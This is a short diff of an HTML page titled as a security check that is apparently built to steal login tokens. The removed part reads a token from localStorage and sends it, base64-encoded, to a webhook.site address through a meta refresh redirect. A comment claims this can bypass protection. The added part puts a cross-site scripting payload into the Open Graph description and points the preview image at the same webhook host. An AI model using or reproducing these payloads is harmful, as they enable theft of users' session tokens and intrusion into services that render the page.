@@ -1,17 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:title" content="Security Confirmation">
-    <script>
-        var t = localStorage.getItem('token') || 'no_token';
-        // Динамически создаем мета-тег, который может пробить защиту
-        var meta = document.createElement('meta');
-        meta.httpEquiv = "refresh";
-        meta.content = "0;url=https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?final_data=" + btoa(t);
-        document.getElementsByTagName('head')[0].appendChild(meta);
-    </script>
+    <meta property="og:title" content="Security Report">
+    <meta property="og:description" content="<img src=x onerror='alert(localStorage.token)'>">
+    <meta property="og:image" content="https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6/logo.png">
 </head>
 <body>
-    <h1>Verifying...</h1>
+    <h1>System Check</h1>
 </body>
 </html>
